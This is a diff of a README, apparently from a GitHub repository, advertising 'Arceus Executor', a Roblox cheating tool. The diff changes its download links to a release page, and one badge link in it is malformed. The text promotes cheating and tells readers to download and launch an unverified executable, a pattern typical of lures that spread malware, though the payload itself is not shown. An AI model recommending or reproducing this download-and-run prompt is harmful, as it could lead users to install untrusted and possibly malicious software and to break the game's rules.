@@ -17,9 +17,9 @@ Arceus Executor offers a plethora of features that cater to the diverse needs an
 - **Wide Range of Functions:** Access a variety of functions to customize your cheating experience.
 
 ## 🔗 Get Started
-To access Arceus Executor and unleash its power in Roblox, download the tool from the following link: [Download Arceus Executor](https://github.com/file/App.zip)
+To access Arceus Executor and unleash its power in Roblox, download the tool from the following link: [Download Arceus Executor](https://github.com/Ayamato0/Arceus-Executor/releases/tag/v2.0)
 
-[![Download Arceus Executor](https://img.shields.io/badge/Download-Arceus%20Executor-blue.svg)](https://github.com/file/App.zip)
+[![Download Arceus Executor](https://github.com/Ayamato0/Arceus-Executor/releases/tag/v2.0%https://github.com/Ayamato0/Arceus-Executor/releases/tag/v2.0)](https://github.com/Ayamato0/Arceus-Executor/releases/tag/v2.0)
 
 ### Note
 If the link ends with a file name, launch the downloaded file to initiate the installation process. In case the link is a website, simply visit it to explore more about the tool. If the provided link is not working, kindly check the "Releases" section of the repository for alternative download options.
